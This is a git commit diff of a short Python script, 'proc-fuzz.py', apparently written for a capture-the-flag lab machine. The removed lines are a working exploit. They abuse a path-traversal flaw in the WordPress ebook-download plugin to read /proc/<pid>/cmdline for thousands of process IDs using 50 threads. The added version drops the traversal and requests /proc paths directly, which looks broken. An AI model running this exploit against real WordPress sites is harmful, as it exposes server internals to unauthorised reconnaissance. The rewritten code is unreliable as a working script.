93b98b39449f0678d87e913d79cf080447aaf93a
ElberHenri <elbenrique@gmail.com>
2024-02-13 14:32:13 -0300

    attProc

--- proc-fuzz.py
+++ proc-fuzz.py
@@ -1,13 +1,24 @@
 #!/usr/bin/python3
-import requests, os
+import requests
 from concurrent.futures import ThreadPoolExecutor
 
 url = "http://10.10.11.125"
-os.system('seq 1 9999 > ids')
-cont = open('ids','r').readlines()
 
-def b(f):
-	r = requests.get(url + '/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../proc/' + f.strip() + '/cmdline')
-	print(r.text.split('../')[24].split('cmdline')[1].split('<script>')[0])
-with ThreadPoolExecutor(max_workers=50) as ex:
-	ex.map(b,cont)
+def b(pid):
+    r = requests.get(f"{url}/proc/{pid}/cmdline")
+    if r.status_code == 200:
+        print(f"[+] Process {pid} command line:")
+        print(r.text)
+    else:
+        print(f"[-] Failed to retrieve command line for process {pid}")
+
+# Gera uma lista de IDs de processo de 1 a 9999
+process_ids = list(range(1, 10000))
+
+# Define o número máximo de threads
+max_workers = 50
+
+# Cria ThreadPoolExecutor com max_workers threads
+with ThreadPoolExecutor(max_workers=max_workers) as ex:
+    # Mapeia a função b para cada ID de processo na lista
+    ex.map(b, process_ids)
